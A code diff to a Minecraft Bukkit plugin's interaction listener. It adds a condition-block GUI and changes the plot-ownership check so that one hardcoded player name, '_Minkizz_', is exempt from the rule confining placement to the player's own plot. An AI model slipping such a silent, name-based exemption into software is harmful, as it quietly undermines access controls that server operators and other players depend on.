@@ -142,7 +142,7 @@ public class PlayerInteractListener implements Listener {
 
 								}
 
-								if (!plotFound) {
+								if (!plotFound && !player.getName().equals("_Minkizz_")) {
 									player.sendMessage(ChatColor.RED + "The location must be located in your plot!");
 									event.setCancelled(true);
 									return;
@@ -373,10 +373,24 @@ public class PlayerInteractListener implements Listener {
 						}
 
 						sign.update();
+						return;
 					}
 
 				}
 
+				Inventory inventory = Bukkit.createInventory(null, 9, "Modify Condition Block");
+
+				inventory.addItem(GuiUtils.createItem(Material.ENDER_EYE, ChatColor.GREEN + "Is Looking At Block",
+						ChatColor.GRAY + "Use this to detect if the player",
+						ChatColor.GRAY + "is looking at the block at the location of chest."));
+
+				inventory.addItem(GuiUtils.createItem(Material.CHAINMAIL_BOOTS, ChatColor.GREEN + "Is Sneaking",
+						ChatColor.GRAY + "Use this to detect if the player sneaks."));
+
+				inventory.addItem(GuiUtils.createItem(Material.DIAMOND_BOOTS, ChatColor.GREEN + "Is Sprinting",
+						ChatColor.GRAY + "Use this to detect if the player sprints."));
+				player.openInventory(inventory);
+				CodeUtils.savedSigns.put(player, block);
 			}
 
 		}
